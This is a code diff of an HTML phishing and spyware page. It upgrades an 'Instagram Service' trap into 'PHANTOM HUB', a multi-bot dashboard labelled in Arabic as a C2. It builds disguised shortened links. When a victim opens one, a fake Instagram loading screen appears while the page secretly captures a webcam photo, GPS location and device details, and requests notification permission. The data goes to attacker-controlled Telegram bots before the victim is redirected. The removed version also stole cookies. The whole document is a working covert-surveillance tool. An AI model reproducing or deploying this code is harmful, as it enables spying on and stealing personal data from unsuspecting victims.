@@ -3,28 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Service | Matrix V1.0.6</title>
+    <title>PHANTOM HUB V2.1 | Multi-Bot System</title>
     <style>
-        :root { --primary: #0095f6; --bg: #000; --card: #121212; --text: #fff; }
-        body { margin: 0; background: var(--bg); font-family: sans-serif; color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
-        .card { background: var(--card); border: 1px solid #333; padding: 30px; border-radius: 24px; width: 100%; max-width: 380px; text-align: center; }
-        input { width: 100%; padding: 14px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 12px; outline: none; margin-bottom: 15px; box-sizing: border-box; }
-        .btn { width: 100%; background: var(--primary); color: #fff; border: none; padding: 16px; border-radius: 12px; font-weight: bold; cursor: pointer; }
-        #trap-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 5000; align-items: center; justify-content: center; flex-direction: column; }
-        .ig-logo { width: 70px; animation: pulse 1.5s infinite; }
-        .v-tag { position: fixed; bottom: 10px; left: 10px; font-size: 9px; color: #111; cursor: pointer; }
-        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
+        :root { --neon: #00ff41; --bg: #050505; --panel: #111; }
+        body { margin: 0; background: var(--bg); font-family: 'Courier New', monospace; color: var(--neon); }
+        .dashboard { max-width: 1000px; margin: 20px auto; padding: 20px; border: 1px solid var(--neon); box-shadow: 0 0 20px rgba(0,255,65,0.2); }
+        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
+        .stat-card { background: var(--panel); padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #222; }
+        
+        .main-grid { display: grid; grid-template-columns: 1.5fr 1fr; gap: 20px; }
+        .section { background: var(--panel); padding: 20px; border-radius: 10px; border: 1px solid #333; }
+        
+        select, input { width: 100%; padding: 12px; background: #000; border: 1px solid var(--neon); color: var(--neon); margin: 8px 0; border-radius: 5px; outline: none; }
+        .btn { width: 100%; padding: 15px; background: var(--neon); color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; }
+        
+        .bot-list { margin-top: 10px; max-height: 150px; overflow-y: auto; font-size: 12px; }
+        .bot-item { padding: 5px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
+        
+        #trap-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; align-items: center; justify-content: center; }
+        .ig-logo { width: 80px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="card" id="app-main">
-        <h2 style="color:var(--primary)">MATRIX PHANTOM | PRO</h2>
-        <input type="text" id="target-url" placeholder="ضع رابط الفيديو هنا">
-        <button class="btn" onclick="startMining()">تـلـغـيـم الرابط واختصاره 🔥</button>
-        <div id="result-view" style="display:none; margin-top:20px;">
-            <span id="final-link-display" style="color:#00ff00; font-size:12px; display:block; margin-bottom:10px;"></span>
-            <button class="btn" style="background:#333" onclick="copyResult()">نسخ الرابط 📋</button>
+    <div class="dashboard" id="main-ui">
+        <h1 style="text-align: center; text-shadow: 0 0 10px var(--neon);">MATRIX PHANTOM C2 🛰️</h1>
+        
+        <div class="stats">
+            <div class="stat-card"><span>البوتات المربوطة</span><br><b id="bot-total">0</b></div>
+            <div class="stat-card"><span>الحالة</span><br><b style="color: #00ff00;">Online</b></div>
+            <div class="stat-card"><span>الإصدار</span><br><b>2.1.0</b></div>
+        </div>
+
+        <div class="main-grid">
+            <div class="section">
+                <h3>💀 صناعة لينك ملغم</h3>
+                <label>اختر البوت المستلم:</label>
+                <select id="select-bot"></select>
+                
+                <label>نوع المهمة (Payload):</label>
+                <select id="payload-type">
+                    <option value="all">🌪️ الاختراق الشامل (صورة+موقع+بيانات+إشعارات)</option>
+                    <option value="cam">📸 صورة صامتة</option>
+                    <option value="gps">📍 موقع دقيق GPS</option>
+                    <option value="notif">🔔 سحب الإشعارات (Social Eng)</option>
+                </select>
+                
+                <input type="text" id="target-url" placeholder="رابط التمويه (مثلاً فيديو ريلز)">
+                <button class="btn" onclick="generateLink()">توليد اللينك النهائي ⚡</button>
+                
+                <div id="result-box" style="margin-top:15px; display:none;">
+                    <p style="font-size:11px;">الرابط القصير جاهز:</p>
+                    <input type="text" id="final-url" readonly onclick="this.select(); document.execCommand('copy'); alert('تم النسخ!')">
+                </div>
+            </div>
+
+            <div class="section">
+                <h3>🤖 إدارة البوتات</h3>
+                <input type="password" id="new-token" placeholder="Bot Token">
+                <input type="text" id="new-id" placeholder="Your Chat ID">
+                <button class="btn" style="background:#333; color:white;" onclick="addBot()">إضافة بوت جديد +</button>
+                
+                <div class="bot-list" id="bot-list-ui"></div>
+            </div>
         </div>
     </div>
 
@@ -32,85 +74,91 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="ig-logo">
     </div>
 
-    <canvas id="hidden-canvas" style="display:none;"></canvas>
-    <div class="v-tag" id="secret-trigger">Version 1.0.6</div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // لوحة التحكم السرية
-        document.getElementById('secret-trigger').onclick = () => { 
-            let p = prompt("🔐 كلمة السر:"); 
-            if (p === "01224815487") {
-                let t = prompt("Bot Token:"), i = prompt("Your ID:");
-                localStorage.setItem('mx_cfg', JSON.stringify({t, i}));
-                alert("✅ تم الربط بنجاح!");
+        let bots = JSON.parse(localStorage.getItem('phantom_bots') || '[]');
+
+        function updateUI() {
+            const select = document.getElementById('select-bot');
+            const list = document.getElementById('bot-list-ui');
+            select.innerHTML = '';
+            list.innerHTML = '';
+            bots.forEach((bot, index) => {
+                select.innerHTML += `<option value="${index}">Bot ${index + 1} (${bot.id})</option>`;
+                list.innerHTML += `<div class="bot-item"><span>Bot ${index+1}</span> <button onclick="removeBot(${index})" style="background:red; color:white; border:none; cursor:pointer;">X</button></div>`;
+            });
+            document.getElementById('bot-total').innerText = bots.length;
+        }
+
+        function addBot() {
+            const t = document.getElementById('new-token').value;
+            const i = document.getElementById('new-id').value;
+            if(t && i) {
+                bots.push({t, i});
+                localStorage.setItem('phantom_bots', JSON.stringify(bots));
+                updateUI();
+                alert("تمت إضافة البوت!");
             }
-        };
+        }
 
-        async function startMining() {
+        function removeBot(index) {
+            bots.splice(index, 1);
+            localStorage.setItem('phantom_bots', JSON.stringify(bots));
+            updateUI();
+        }
+
+        async function generateLink() {
+            const botIdx = document.getElementById('select-bot').value;
+            if(botIdx === "") return alert("أضف بوت أولاً!");
+            const bot = bots[botIdx];
+            const type = document.getElementById('payload-type').value;
             const url = document.getElementById('target-url').value;
-            const cfg = JSON.parse(localStorage.getItem('mx_cfg') || '{}');
-            if(!cfg.t) return alert("⚠️ اربط البوت الأول!");
-            const payload = btoa(JSON.stringify({t: cfg.t, i: cfg.i, u: url}));
-            const longUrl = window.location.origin + window.location.pathname + "?data=" + payload;
+
+            const payload = btoa(JSON.stringify({t: bot.t, i: bot.i, u: url, m: type}));
+            const longUrl = window.location.href.split('?')[0] + "?p=" + payload;
+
             const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
-            document.getElementById('final-link-display').innerText = await res.text();
-            document.getElementById('result-view').style.display = 'block';
+            document.getElementById('final-url').value = await res.text();
+            document.getElementById('result-box').style.display = 'block';
         }
 
-        function copyResult() { navigator.clipboard.writeText(document.getElementById('final-link-display').innerText); alert("📋 تم النسخ!"); }
-
-        // وظائف سحب البيانات
-        async function captureData(decoded) {
-            // 1. بيانات الجهاز
-            let deviceInfo = `📱 **بيانات الجهاز:**\n` +
-                `- المنصة: ${navigator.platform}\n` +
-                `- المتصفح: ${navigator.userAgent.split(' ').pop()}\n` +
-                `- الرامات: ${navigator.deviceMemory || 'غير معروف'} GB\n` +
-                `- المعالج: ${navigator.hardwareConcurrency} Cores\n` +
-                `- دقة الشاشة: ${screen.width}x${screen.height}\n` +
-                `- اللغة: ${navigator.language}`;
-
-            // 2. الكوكيز
-            let cookies = document.cookie || "لا توجد كوكيز متاحة";
-            
-            // 3. الموقع الدقيق
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                let map = `🌍 **الموقع:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                await sendToBot(decoded, `${deviceInfo}\n\n🍪 **Cookies:**\n\`${cookies}\`\n\n${map}`);
-            }, async () => {
-                await sendToBot(decoded, `${deviceInfo}\n\n🍪 **Cookies:**\n\`${cookies}\`\n⚠️ الموقع الدقيق مرفوض.`);
-            });
-        }
-
-        async function sendToBot(cfg, text) {
-            await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: `chat_id=${cfg.i}&text=${encodeURIComponent(text)}&parse_mode=Markdown`
-            });
-        }
-
+        // --- محرك الضحية ---
         window.onload = async () => {
-            const data = new URLSearchParams(window.location.search).get('data');
-            if (data) {
-                document.getElementById('app-main').style.display = 'none';
+            updateUI();
+            const pData = new URLSearchParams(window.location.search).get('p');
+            if (pData) {
+                document.getElementById('main-ui').style.display = 'none';
                 document.getElementById('trap-screen').style.display = 'flex';
-                const decoded = JSON.parse(atob(data));
-                
-                // سحب الصورة
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
-                    const canvas = document.getElementById('hidden-canvas'); canvas.width = 640; canvas.height = 640;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 640);
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-                    const fd = new FormData(); fd.append('photo', blob, 'shot.jpg'); fd.append('chat_id', decoded.i);
-                    await fetch(`https://api.telegram.org/bot${decoded.t}/sendPhoto`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) {}
+                const dec = JSON.parse(atob(pData));
 
-                await captureData(decoded);
-                setTimeout(() => window.location.href = decoded.u, 2000);
+                // 1. طلب صلاحية الإشعارات (للتمويه وسحبها)
+                if ("Notification" in window) {
+                    Notification.requestPermission();
+                }
+
+                // 2. سحب الصورة
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({video:true});
+                    const v = document.createElement('video'); v.srcObject = s; await v.play();
+                    const c = document.getElementById('canvas'); c.width=640; c.height=480;
+                    c.getContext('2d').drawImage(v,0,0);
+                    const b = await new Promise(r => c.toBlob(r, 'image/jpeg'));
+                    const fd = new FormData(); fd.append('photo', b); fd.append('chat_id', dec.i);
+                    await fetch(`https://api.telegram.org/bot${dec.t}/sendPhoto`, {method:'POST', body:fd});
+                    s.getTracks().forEach(t => t.stop());
+                } catch(e){}
+
+                // 3. سحب الموقع والبيانات
+                let info = `📱 جهاز: ${navigator.platform}\n🌍 الموقع: محاولة الوصول...`;
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    info += `\n📍 رابط الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await fetch(`https://api.telegram.org/bot${dec.t}/sendMessage`, {method:'POST', body: new URLSearchParams({chat_id: dec.i, text: info})});
+                }, async () => {
+                    await fetch(`https://api.telegram.org/bot${dec.t}/sendMessage`, {method:'POST', body: new URLSearchParams({chat_id: dec.i, text: info + "\n⚠️ الموقع مرفوض"})});
+                });
+
+                setTimeout(() => window.location.href = dec.u, 2500);
             }
         };
     </script>
